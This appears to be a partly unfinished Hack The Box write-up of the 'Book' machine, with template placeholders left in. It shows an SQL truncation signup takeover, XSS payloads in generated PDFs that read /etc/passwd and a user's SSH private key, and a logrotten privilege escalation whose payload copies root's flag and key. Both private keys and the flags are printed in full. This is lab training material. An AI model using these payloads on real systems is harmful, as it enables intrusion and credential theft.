# HTB - <Machine_Name>

## Overview

![](<machine>.infocard.png)

<Short description to include any strange things to be dealt with> 

## Useful Skills and Tools

#### <Useful thing 1>

<description with generic example>

#### <Useful thing 2>

<description with generic example>

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `<ip>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
```
zweilos@kalimaa:~/htb/book$ nmap -p- -sC -sV -oN book.nmap 10.10.10.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 14:38 EDTNmap scan report for 10.10.10.176
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8272.93 seconds
```
only two ports opn, 22 -ssh and 80 - http, nothing to do except check to see what is hosted on port 80.

navigating to 10.10.10.176 leads to a login page.  Peaking at the source code of the page shows an interesting script embedded in the html.
```
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
</script>
```
https://resources.infosecinstitute.com/sql-truncation-attack/#gref

```
How the select query works:
Before passing data to the ‘insert’ query, the ‘select’ query matches the username with the previous entries to reveal any redundant entries. As the username we entered is ‘admin          1’ the select query will not find any similar entry and pass the data to the insert query to do its job.

How 'insert' query stores data.
Talking about mysql, all strings are truncated before being stored in the database. Also, there is a length restriction of 16 characters. So, ‘admin           1’ (17 Characters) will be cut to 16 characters by removing the last digit. After passing the validation, the username is ‘admin           ‘ which will be stored as ‘admin’ because of truncation.

How the select query fetches.
When we try to login with username = ‘admin’  and the password that we created, the select query successfully finds this pair and lets us login with admin privileges.
```

admin@book.htb - gained from contact page; trying to use burp to guess password on /admin/index.php doesnt work

forgot password doesnt work
Attacking the Sign up page using Sql Truncate
```
POST /index.php HTTP/1.1
Host: 10.10.10.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.176/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Connection: close
Cookie: PHPSESSID=630fii00brfacrkgee7jom2p4d
Upgrade-Insecure-Requests: 1
DNT: 1

name=admin&email=admin%40book.htb                                    test&password=admin!!!
```

form will only accept input of a certain length, everything else is truncated.  Was able to change admin logon with this by registering a new user named admin, admin.book.htb with spaces, and a password.
Seemingly I had hit a dead end.  

## Enumeration with Dirbuster
```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jun 07 12:08:31 EDT 2020
--------------------------------

http://10.10.10.176:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/admin/

Dirs found with a 403 response:

/images/
/icons/
/docs/
/icons/small/
/admin/export/
/admin/vendor/

--------------------------------
Files found during testing:

Files found with a 302 responce:

/download.php
/contact.php
/search.php
/home.php
/profile.php
/books.php
/feedback.php
/admin/home.php
/admin/feedback.php
/admin/users.php
/admin/messages.php
/logout.php
/collections.php
/settings.php

Files found with a 200 responce:

/index.php
/admin/index.php
/db.php
--------------------------------
```
I checked the progress of my Dirbuster scan, and was pleasantly surprised to see some an `/admin/index.php` page listed.  I tried using my new admin credentials I had created and logged in.

## Initial Foothold
## Road to User

You can see that the author and book name is reflecting in the pdf

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html


## Testing Code Execution with XSS

`<img src=x onerror=document.write('test')>`

"test" was written to the pdf!

## Local File Inclusion (LFI) through XSS Cross Site Scripting

the pdf that is uploaded to the site can be downloaded through the admin portal, but the pdf output the admin portal collections page makes is dynamically projected html.  This can be exploited to xss ^ with javascript.  Code execution! lets try to get `/etc/passwd` now. I used burp to make sending the request easier each time.
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

LFI vulnerability confirmed.  Only reader and root can login.  user 'reader' was identified through getting the /etc/passwd file, then need to see if he has ssh key file since port 22 is open, and I have not found any passwords anywhere


### Finding user creds
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>

```
had to open pdf in firefox then ctrl-a, ctrl-c, otherwise text is truncated in default pdf reader
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

### User.txt
remember to chmod 600 id_rsa before use
```
zweilos@kalimaa:~/htb/book$ ssh -i id_rsa reader@10.10.10.176
The authenticity of host '10.10.10.176 (10.10.10.176)' can't be established.                           
ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9/eAeT/9wUfoQQk.                           
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                               
Warning: Permanently added '10.10.10.176' (ECDSA) to the list of known hosts.                          
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  7 17:03:39 UTC 2020

  System load:  0.02               Processes:            265
  Usage of /:   26.5% of 19.56GB   Users logged in:      2
  Memory usage: 40%                IP address for ens33: 10.10.10.176
  Swap usage:   0%

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jun  7 17:00:50 2020 from 10.10.14.147
reader@book:~$ cat user.txt 
51c1d4b5197fa30e3e5d37f8778f95bc
reader@book:~$
```
## Path to Power \(Gaining Administrator Access\)
### Enumeration as User <username>
linpeas.sh
```
[+] Modified interesting files in the last 5mins
/tmp/temp/1.c                                                                                          
/var/log/auth.log
/var/log/lastlog
/var/log/syslog
/var/log/kern.log
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/log/journal/8af6dac9d80548db9b25b66974ae4eb0/system.journal
/var/log/journal/8af6dac9d80548db9b25b66974ae4eb0/user-1000.journal
/var/log/wtmp
/home/reader/.gnupg/trustdb.gpg
/home/reader/.gnupg/pubring.kbx

[+] Writable log files (logrotten)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
Writable: /home/reader/backups/access.log.1                                                            
Writable: /home/reader/backups/access.log                                                              
```
## Logrotate exploitation (logrotten)
Looks like I might not have to do much searching to find a vulnerability.  I then read the blog post about logrotate-exploitation

```
[+] Files inside /home/reader (limit 20)
total 3092                                                                                             
drwxr-xr-x 7 reader reader    4096 Jun  7 17:45 .
drwxr-xr-x 3 root   root      4096 Nov 19  2019 ..
drwxr-xr-x 2 reader reader    4096 Jun  7 17:00 backups
lrwxrwxrwx 1 reader reader       9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 reader reader     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 reader reader    3771 Apr  4  2018 .bashrc
drwx------ 2 reader reader    4096 Nov 19  2019 .cache
drwx------ 3 reader reader    4096 Jun  7 17:47 .gnupg
drwxrwxr-x 3 reader reader    4096 Nov 20  2019 .local
-rwxrwxr-x 1 reader reader   34316 Jan 29 08:28 lse.sh
-rw-r--r-- 1 reader reader     807 Apr  4  2018 .profile
-rwxrwxr-x 1 reader reader 3078592 Aug 22  2019 pspy64
drwx------ 2 reader reader    4096 Nov 28  2019 .ssh
-r-------- 1 reader reader      33 Nov 29  2019 user.txt
-rw------- 1 reader reader    1639 Jun  7 17:45 .viminfo
```

Using pspy to check running proccesses I found this interesting line: `2020/06/07 17:08:01 CMD: UID=0    PID=16535  | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`
``
root     120188  0.5  0.2  46832  6000 pts/1    Ss+  01:33   0:00 ssh -i .ssh/id_rsa localhost
root     120192  0.0  0.3 107984  7140 ?        Ss   01:33   0:00 sshd: root@pts/2
``
`2020/06/07 17:08:30 CMD: UID=0    PID=16773  | /usr/sbin/logrotate -f /root/log.cfg `
So the system was indeed running logrotate.  Time to test out this exploit to see if I could escalate privileges to root.

### Getting a shell
```
[+] Writable log files (logrotten)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
Writable: /home/reader/backups/access.log.1                                                            
Writable: /home/reader/backups/access.log 
```
linpeas.sh also told me that there were writable log files in `reader`'s home directory, and that this could potentially by exploited through the logrotate service. Checking out the provided link gave me the following helpful information:

> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotatewrite a file in any location. If logrotate is being executed by root, then the user will be able to write any file in /etc/bash_completion.d/  that will be executed by any user that login.
> So, if you have write perms over a log file or any of its parent folder, you can privesc (on most linux distributions, logrotate is executed automatically once a day as user root). Also, check if apart of /var/log there are more files being rotated.
> More detailed information about the vulnerability can be found in this page https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition.
> You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).


```
reader@book:/dev/shm$ ./logrotten -p ./payload /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

```
payload: 
```
#!/bin/bash
/bin/cat /root/root.txt > /dev/shm/test
/bin/cat /root/.ssh/id_rsa > /dev/shm/test2
```
in order to force log rotation:
```
reader@book:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
reader@book:~/backups$ cp access.log.1 access.log

### Root.txt
(root.txt)
reader@book:/dev/shm$ cat test 
84da92adf998a1c7231297f70dd89714
```
```
reader@book:/dev/shm$ cat test2
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J
cFzQxCMM/E8UwLdD0fzUJtDgo4SUuwUmkPc6FXuLrZ+xqJaKoeu7/3WgjNBnRc7E
z6kgpwnf4GOqpvxx1R1W+atbMkkWn6Ne89ogCUarJFVMEszzuC+14Id83wWSc8uV
ZfwOR1y/Xqdu82HwoAMD3QG/gu6jER8V7zsC0ByAyTLT7VujBAP9USfqOeqza2UN
GWUqIckZ2ITbChBuTeahfH2Oni7Z3q2wXzn/0yubA8BpyzVut4Xy6ZgjpH6tlwQG
BEbULdw9d/E0ZFHN4MoNWuKtybx4iVMTBcZcyQIDAQABAoIBAQCgBcxwIEb2qSp7
KQP2J0ZAPfFWmzzQum26b75eLA3HzasBJOGhlhwlElgY2qNlKJkc9nOrFrePAfdN
PeXeYjXwWclL4MIAKjlFQPVg4v0Gs3GCKqMoEymMdUMlHoer2SPv0N4UBuldfXYM
PhCpebtj7lMdDGUC60Ha0C4FpaiJLdbpfxHase/uHvp3S/x1oMyLwMOOSOoRZZ2B
Ap+fnQEvGmp7QwfH+cJT8ggncyN+Gc17NwXrqvWhkIGnf7Bh+stJeE/sKsvG83Bi
E5ugJKIIipGpZ6ubhmZZ/Wndl8Qcf80EbUYs4oIICWCMu2401dvPMXRp7PCQmAJB
5FVQhEadAoGBAOQ2/nTQCOb2DaiFXCsZSr7NTJCSD2d3s1L6cZc95LThXLL6sWJq
mljR6pC7g17HTTfoXXM2JN9+kz5zNms/eVvO1Ot9GPYWj6TmgWnJlWpT075U3CMU
MNEzJtWyrUGbbRvm/2C8pvNSbLhmtdAg3pDsFb884OT8b4arufE7bdWHAoGBAMjo
y0+3awaLj7ILGgvukDfpK4sMvYmx4QYK2L1R6pkGX2dxa4fs/uFx45Qk79AGc55R
IV1OjFqDoq/s4jj1sChKF2+8+JUcrJMsk0WIMHNtDprI5ibYy7XfHe7oHnOUxCTS
CPrfj2jYM/VCkLTQzdOeITDDIUGG4QGUML8IbM8vAoGBAM6apuSTzetiCF1vVlDC
VfPEorMjOATgzhyqFJnqc5n5iFWUNXC2t8L/T47142mznsmleKyr8NfQnHbmEPcp
ALJH3mTO3QE0zZhpAfIGiFk5SLG/24d6aPOLjnXai5Wgozemeb5XLAGOtlR+z8x7
ZWLoCIwYDjXf/wt5fh3RQo8TAoGAJ9Da2gWDlFx8MdC5bLvuoOX41ynDNlKmQchM
g9iEIad9qMZ1hQ6WxJ8JdwaK8DMXHrz9W7yBXD7SMwNDIf6u1o04b9CHgyWXneMr
nJAM6hMm3c4KrpAwbu60w/AEeOt2o8VsOiusBB80zNpQS0VGRTYFZeCF6rKMTP/N
WU6WIckCgYBE3k00nlMiBNPBn9ZC6legIgRTb/M+WuG7DVxiRltwMoDMVIoi1oXT
ExVWHvmPJh6qYvA8WfvdPYhunyIstqHEPGn14fSl6xx3+eR3djjO6J7VFgypcQwB
yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ==
-----END RSA PRIVATE KEY-----
```
As always, remember to `chmod 600` your private SSH key files!
```
zweilos@kalimaa:~/htb/book$ chmod 600 root.id_rsa 
zweilos@kalimaa:~/htb/book$ ssh -i root.id_rsa root@10.10.10.176
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Feb 19 14:49:02 2020 from ::1
root@book:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
book
root@book:~# 
```
Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for <something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
